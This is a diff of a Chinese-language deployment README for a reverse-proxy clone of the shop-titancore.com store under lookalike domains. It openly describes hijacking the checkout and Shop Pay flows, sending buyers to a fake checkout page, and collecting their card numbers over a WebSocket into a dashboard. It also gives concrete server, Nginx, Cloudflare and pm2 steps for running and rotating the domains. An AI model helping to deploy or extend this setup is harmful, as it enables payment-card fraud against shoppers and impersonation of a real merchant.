@@ -1,236 +1,79 @@
-# TitanCore Mirror — lotusscom.my 部署
+# TitanCore Mirror — titancore.my 部署
 
-在 **lotusscom.my** 服务器上部署 TitanCore 镜像，源站为 [shop-titancore.com](https://shop-titancore.com/products/hybrid-pots-pans-set-12-pc)。
+在 **titancore.my** 部署 TitanCore 镜像，源站为 [shop-titancore.com](https://shop-titancore.com/products/hybrid-pots-pans-set-12-pc)。
 
 ## 架构
 
 - **Storefront**：反代 shop-titancore.com 商品页/购物车
-- **Checkout**：劫持 `/checkout`、`/checkouts/*`、`shop.app` → 自建 `/checkout/`（仿 TitanCore UI）
+- **Checkout**：劫持 `/checkout`、`/checkouts/*`、`shop.app` → 自建 `/checkout/`
 - **收卡**：WebSocket `wss://{host}/api/?role=customer` → dashboard `:9528`
-
-## 一键部署
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/Rshijituan-baozi/titancore-mirror/main/deploy.sh | sudo bash
-```
-
-脚本会：
-
-- 停止 PM2 `lotus` / `neoflam`
-- 克隆/更新 `/app/titancore-mirror`
-- 启动 PM2 `titancore`（端口 **3000**）
-- 配置 Nginx（含 `/api/` WebSocket → 9528）
 
 ## 环境变量（`/app/titancore-mirror/.env`）
 
 ```env
 PORT=3000
 TARGET_URL=https://shop-titancore.com
-PUBLIC_HOST=www.lotusscom.my
+PUBLIC_HOST=www.titancore.my
 ADMIN_API_BASE=http://127.0.0.1:9528
 ```
 
-## 手动上传部署包（无 Git 时）
+## 从 lotusscom.my 换到 titancore.my
 
-本地已生成 `titancore-mirror-deploy.tgz`，上传到服务器：
+**不用改 Node 代码**，服务器上按顺序做：
 
-```powershell
-scp "C:\Users\Administrator\Desktop\鱼台开发\titancore-mirror-deploy.tgz" root@124.156.204.251:/root/
-```
+### 1. Cloudflare — titancore.my
 
-服务器：
+| 类型 | 名称 | 内容 |
+|------|------|------|
+| A | `@` | 服务器 IP |
+| A 或 CNAME | `www` | 同上 |
 
-```bash
-mkdir -p /app/titancore-mirror
-tar -xzf /root/titancore-mirror-deploy.tgz -C /app/titancore-mirror
-cd /app/titancore-mirror
-npm ci --omit=dev
-cat > .env <<'EOF'
-PORT=3000
-TARGET_URL=https://shop-titancore.com
-PUBLIC_HOST=www.lotusscom.my
-ADMIN_API_BASE=http://127.0.0.1:9528
-EOF
-pm2 stop lotus neoflam 2>/dev/null; pm2 delete lotus neoflam 2>/dev/null
-pm2 start src/index.js --name titancore --cwd /app/titancore-mirror --update-env
-pm2 save
-bash deploy.sh   # 或仅配置 Nginx 段
-```
+完成后 **Purge Cache**。
 
-## 手动更新
-
-```bash
-cd /app/titancore-mirror && git pull origin main && npm ci --omit=dev && pm2 restart titancore --update-env
-```
-
-若只改了 `custom/checkout/*.js`（如 payment-core、tt-pixel），生产机可改用（**不需要 cheerio**）：
-
-```bash
-git pull origin main
-npm run sync:checkout
-pm2 restart titancore --update-env
-```
-
-`npm run step:5` 会重建整个 `public/checkout/index.html`，依赖 **devDependencies**（cheerio）。生产环境若只跑了 `npm ci --omit=dev`，需先：
-
-```bash
-npm install cheerio
-npm run step:5
-```
-
-或在本机跑完 step:5 再 commit（仓库里已含 `public/checkout/` 时，服务器 **git pull + restart 即可**）。
-
-## 本地测试
-
-```bash
-npm ci
-npm test
-npm run test:passthrough   # PoC：透传原站 checkout（不劫持）
-node scripts/test-ws-smoke.mjs
-```
-
-## 添加域名 titancore.my
-
-**后台「前端域名」不会生效**（那只改 soybean 的 Nginx）。TitanCore 镜像要在 **Cloudflare + 服务器 Nginx** 上配置。
-
-### 1. Cloudflare（域名 titancore.my）
-
-| 类型 | 名称 | 内容 | 说明 |
-|------|------|------|------|
-| A | `@` | 与 lotusscom.my 相同的服务器 IP | 裸域 |
-| A 或 CNAME | `www` | 同上或 `@` | 建议也加 www |
-| SSL | — | 完全 / 灵活 | 与现站一致即可 |
-
-保存后 **Purge Cache**。
-
-### 2. 服务器 Nginx（二选一）
-
-**方式 A — 手动改（最快）**
+### 2. Nginx（只保留 titancore.my）
 
 ```bash
 sudo nano /etc/nginx/sites-available/titancore
 ```
 
-把 `server_name` 改成包含新域，例如：
-
 ```nginx
-server_name lotusscom.my www.lotusscom.my titancore.my www.titancore.my;
+server_name titancore.my www.titancore.my;
 ```
-
-然后：
 
 ```bash
 sudo nginx -t && sudo systemctl reload nginx
 ```
 
-**方式 B — 用 deploy 脚本重写 Nginx**
+或：
+
+```bash
+cd /app/titancore-mirror && git pull origin main
+sudo DOMAIN=titancore.my PUBLIC_HOST=www.titancore.my bash deploy.sh
+```
+
+### 3. .env + 重启
 
 ```bash
 cd /app/titancore-mirror
-git pull origin main
-sudo EXTRA_DOMAINS="titancore.my www.titancore.my" bash deploy.sh
-# 或只重跑 Nginx 段：同上，脚本会写入 EXTRA_DOMAINS
+# 编辑 .env：PUBLIC_HOST=www.titancore.my
+pm2 restart titancore --update-env
 ```
 
-### 3. Node / .env
+### 4. 旧域 lotusscom.my（可选）
 
-**一般不用改代码**。多域名共用同一套反代，靠请求里的 `Host` 即可。
+- 不用了：Cloudflare 删除/暂停 A 记录
+- 要跳转：CF 做 301 → `https://www.titancore.my`
 
-若希望 Cookie 兜底域名改为 titancore.my，可编辑 `/app/titancore-mirror/.env`：
-
-```env
-PUBLIC_HOST=www.titancore.my
-```
-
-然后 `pm2 restart titancore --update-env`。与 lotusscom.my **同时使用时** 可保持 `PUBLIC_HOST=www.lotusscom.my` 或不填。
-
-### 4. 验收
-
-```bash
-curl -sI -H "Host: www.titancore.my" http://127.0.0.1/ | head -5
-```
-
-浏览器访问：
+### 5. 验收
 
 - https://www.titancore.my/
-- https://www.titancore.my/products/hybrid-pots-pans-set-12-pc
 - https://www.titancore.my/checkout/
+- https://www.titancore.my/tpmn/lan
 
-## Advertorial 落地页 `/tpmn/lan`
+> 后台「前端域名」**不会**改 titancore 的 Nginx，必须在服务器改。
 
-源站 [shop-titancore.com/tpmn/lan](https://www.shop-titancore.com/tpmn/lan) 的软文页**只挂在 `www.shop-titancore.com`**，裸域会 404。同域还有 `/core.min.js`、`/core.min.css` 等 Advertorial 静态资源也只在 www 上。镜像对 `/tpmn/*`、`/core.min.*`、`/public/*` 走 www 上游。
-
-部署后验收：`https://www.lotusscom.my/tpmn/lan` 应显示 Advertorial 软文，而非 404。CTA 与 hero 图会在代理层改写：`get-titancore.com` → `/products/hybrid-pots-pans-set-12-pc`，hero 图 → Shopify CDN `333.png`（可用 `LAN_PRODUCT_PATH` / `LAN_HERO_IMAGE` 覆盖）。
-
-## 验收
-
-1. https://www.lotusscom.my/products/hybrid-pots-pans-set-12-pc — 产品页正常
-2. Claim Offer / 加购 → `/cart` 有商品
-3. Checkout → `/checkout/`（不进 `shop-titancore.com/checkouts`）
-4. 自建结账页含 Step 1/3、TitanCore logo、MYR 订单摘要
-5. `curl -s https://www.lotusscom.my/ | grep isShopifyCheckoutUrl`
-6. WebSocket 提交测试卡号，dashboard 有 session
-
-## Checkout 透传 PoC 结论
-
-运行 `npm run test:passthrough` 后查看 `scripts/poc-passthrough-report.json`：
-
-| 项目 | 结论 |
-|------|------|
-| 同域 `/checkouts/cn/...` | HTML 可反代，但 Cookie domain 需改写 |
-| Shop Pay | 会跳转 `shop.app`，需改写 `ur_back_url` |
-| PCI 卡号 | 在 `checkout.pci.shopifyinc.com` iframe，**无法收卡** |
-| 生产 | 必须使用自建 `/checkout/` + 劫持 |
-
-## 回滚 Lotus
+## 日常更新
 
 ```bash
-pm2 stop titancore && pm2 delete titancore
-pm2 start /app/lotus-mirror/src/index.js --name lotus --cwd /app/lotus-mirror
-ln -sf /etc/nginx/sites-available/lotus /etc/nginx/sites-enabled/titancore
-nginx -t && systemctl reload nginx
+cd /app/titancore-mirror && git pull origin main && pm2 restart titancore --update-env
 ```
-
-## Cloudflare
-
-切换后 **Purge Cache**。若出现 `ERR_QUIC_PROTOCOL_ERROR`，静态资源已改为直连 `shop-titancore.com/cdn/...`；若仍有个别资源报错，可后续再排查。
-
-## 部署后页面无样式
-
-`/cdn/shop/**` CSS/JS 已改为浏览器直连源站 CDN，避免经 lotusscom.my 代理大文件触发 QUIC 错误。更新后：
-
-```bash
-cd /app/titancore-mirror && sudo git pull origin main && npm ci --omit=dev
-sudo pm2 restart titancore --update-env
-sudo nginx -t && sudo systemctl reload nginx
-```
-
-`nginx` 需包含 `location = /api/settings` → Node `:3000`（deploy.sh 已更新）。
-
-## 部署后仍显示 Lotus？
-
-**常见原因**：`ubuntu` 用户的 PM2 里 **lotus 仍占 3000**，而 deploy 用 root 启动 titancore 失败。本机无 Caddy 时 Nginx:80 → :3000 仍会打到 lotus。
-
-**立即修复**：
-
-```bash
-# 停 ubuntu 用户下的 lotus
-pm2 stop lotus && pm2 delete lotus
-pm2 save
-
-# 用 root 启动 titancore（若 titancore 不在 root pm2 里）
-cd /app/titancore-mirror
-sudo pm2 stop titancore 2>/dev/null; sudo pm2 delete titancore 2>/dev/null
-sudo fuser -k 3000/tcp 2>/dev/null; sleep 1
-sudo pm2 start src/index.js --name titancore --cwd /app/titancore-mirror --update-env
-sudo pm2 save
-
-# 验证（应看到 PFAS / TitanCore，进程名含 titancore）
-sudo ss -tlnp | grep 3000
-curl -s http://127.0.0.1:3000/ | grep -i PFAS
-curl -s -H "Host: www.lotusscom.my" http://127.0.0.1/ | grep -i PFAS
-```
-
-Cloudflare **Purge Cache** 后无痕访问产品页。
-
-或重新跑修复版 deploy：`curl -fsSL .../deploy.sh | sudo bash`
